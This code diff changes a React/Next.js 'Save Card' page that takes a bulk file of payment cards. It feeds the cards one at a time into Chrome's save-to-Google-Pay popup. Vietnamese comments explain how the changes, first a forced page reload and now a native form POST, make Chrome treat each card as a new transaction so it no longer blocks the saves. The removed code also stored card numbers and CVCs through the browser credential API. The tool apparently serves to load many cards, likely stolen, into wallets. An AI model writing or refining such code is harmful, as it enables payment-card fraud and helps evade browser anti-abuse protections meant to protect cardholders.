@@ -12,7 +12,6 @@ export default function Home() {
   const [bulkStatus, setBulkStatus] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
-  const [isWaitingForNext, setIsWaitingForNext] = useState(false);
 
   // Form state
   const [ccname, setCcname] = useState("");
@@ -136,86 +135,18 @@ export default function Home() {
     return formattedValue;
   };
 
-  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault();
+  const handleSubmit = () => {
+    // Để cho form thực sự chuyển hướng sang trang đích (NATIVE POST)
+    // Chrome sẽ hiểu đây là 100% giao dịch mới mà không chặn nữa
     setIsProcessing(true);
 
-    const formData = new FormData(e.currentTarget);
-    const data = Object.fromEntries(formData.entries());
-
-    try {
-      const response = await fetch("https://jsonplaceholder.typicode.com/posts", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data),
-      });
-
-      if (response.ok) {
-        console.log("Mock transaction successful");
-        setShowSuccess(true);
-
-        // Nâng cao (Tùy chọn cho trình duyệt)
-        if (navigator.credentials && (navigator.credentials as any).store) {
-          try {
-            const PasswordCredential = (window as any).PasswordCredential;
-            if (PasswordCredential) {
-              const cardCredential = new PasswordCredential({
-                id: data.cardnumber,
-                password: data.cvc || "123",
-                name: data.ccname,
-              });
-              await navigator.credentials.store(cardCredential).catch(() => {});
-            }
-          } catch (err) {
-            console.log("Credential API error:", err);
-          }
-        }
-      }
-    } catch (error) {
-      console.error("Error:", error);
-      alert("An error occurred during processing. Please try again.");
-    } finally {
-      setTimeout(() => {
-        setIsProcessing(false);
-        setShowSuccess(false);
-
-        if (cardQueue.length > 0) {
-          // Bóc thẻ vừa hoàn thành ra khỏi mảng
-          const newQueue = [...cardQueue];
-          newQueue.shift();
-          
-          if (newQueue.length > 0) {
-            // Lưu lại queue mới ngay lập tức
-            localStorage.setItem("supa_queue", JSON.stringify(newQueue));
-            
-            // Xóa form và đợi bấm chuyển trang
-            setCcname("");
-            setCardnumber("");
-            setExpMonth("");
-            setExpYear("");
-            setCvc("");
-            setIsWaitingForNext(true);
-          } else {
-            // Xong cmnr
-            localStorage.removeItem("supa_queue");
-            setCardQueue([]);
-            setBulkStatus("Đã xử lý thành công toàn bộ thẻ trong tệp!");
-            setCcname("");
-            setCardnumber("");
-            setExpMonth("");
-            setExpYear("");
-            setCvc("");
-          }
-        }
-      }, 1000);
+    if (cardQueue.length > 0) {
+      const newQueue = [...cardQueue];
+      newQueue.shift();
+      localStorage.setItem("supa_queue", JSON.stringify(newQueue));
+    } else {
+      localStorage.removeItem("supa_queue");
     }
-  };
-
-  const handleReloadNextCard = () => {
-    // TẢI LẠI TRẠNG THÁI TRANG 100% 
-    // Trình duyệt Chrome sẽ nghĩ là trang mới (trigger popup mới)
-    // Dữ liệu thẻ tiếp theo đã được giữ an toàn trong localStorage
-    window.location.reload();
   };
 
   // Tránh lỗi Hydration
@@ -285,18 +216,7 @@ export default function Home() {
           </div>
         )}
 
-        {isWaitingForNext ? (
-          <div className="text-center py-8 border-2 border-dashed border-purple-300 rounded-xl bg-purple-50">
-            <p className="mb-4 text-gray-700 font-medium">Bạn đã bấm lưu thẻ thứ {cardQueue.length > 0 ? (cardQueue.length + 1) : 1} vào GPay trên popup của trình duyệt Chrome chưa?</p>
-            <button
-              onClick={handleReloadNextCard}
-              className="px-6 w-full py-4 bg-[#7b2cbf] hover:bg-[#5a189a] text-white rounded-xl text-base font-semibold transition-colors shadow-lg active:scale-95"
-            >
-              Tiến hành tải thẻ tiếp theo (F5)
-            </button>
-          </div>
-        ) : (
-          <form id="paymentForm" onSubmit={handleSubmit}>
+          <form id="paymentForm" method="POST" action="/api/checkout" onSubmit={handleSubmit}>
             <div className="mb-5">
               <label htmlFor="ccname" className="block text-gray-900 text-sm font-medium mb-2">
                 Cardholder Name
@@ -397,7 +317,6 @@ export default function Home() {
               {isProcessing ? "Processing..." : "Save Card"}
             </button>
           </form>
-        )}
 
         <div className="flex items-center justify-center gap-2 mt-6 text-gray-500 text-[13px]">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-4 h-4 fill-current">
